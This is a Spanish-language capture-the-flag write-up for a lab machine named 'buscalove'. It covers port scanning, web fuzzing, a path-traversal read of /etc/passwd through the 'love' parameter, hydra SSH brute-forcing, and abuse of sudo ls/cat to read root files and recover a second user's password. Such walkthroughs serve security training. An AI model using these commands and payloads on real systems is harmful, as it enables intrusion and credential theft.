### Máquina buscalove

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.18.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64


## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.18.0.2

![alt text](1.png)


## Fuzzing web

gobuster dir -t 200 -u http://172.18.0.2:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

encontramos esta ruta:

http://172.18.0.2/wordpress/

inspeccionamos:

<!-- El desarollo de esta web esta en fase verde muy verde te dejo aqui la ventana abierta con mucho love para los curiosos que gustan de leer -->

lo que nos hace pensar que puede hacer un usuario love, hice un ataque con hydra y no funciono entonces lo que se me ocurrio fue hacer fuzzing web a 

http://172.18.0.2/wordpress/ y me arrojo el index.php, 

http://172.18.0.2/wordpress/index.php entonces me hizo pensar que se trata de un LFI..

usando wfuzz:

wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd --hc 404 --hl 40

![alt text](3.png)


encontramos el parametro love, hacemos en la url http://172.18.0.2/wordpress/index.php?love=../../../../../../../etc/passwd

![alt text](2.png)

encontramos los usuarios:

rosa y pedro

## Intrusion

utilizamos hydra y nos funciono para el usuario rosa

hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 16 -w 1 

contraseña: lovebug

ingresamos por ssh, y luego hacemos sudo -l

![alt text](image.png)


podemos usar /usr/bin/ls y /usr/bin/cat para ver dentro de pedro y de root

en root encontramos un archivo secret.txt que contiene lo siguiente:

![alt text](image-1.png)

![alt text](image-2.png)

4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B

desencriptamos con cybercheff:

![alt text](image-3.png)

Cambiamos al usuario pedro, escribimos la contraseña desencriptada

![alt text](image-4.png)


## Escalar privilegios

![alt text](image-5.png)
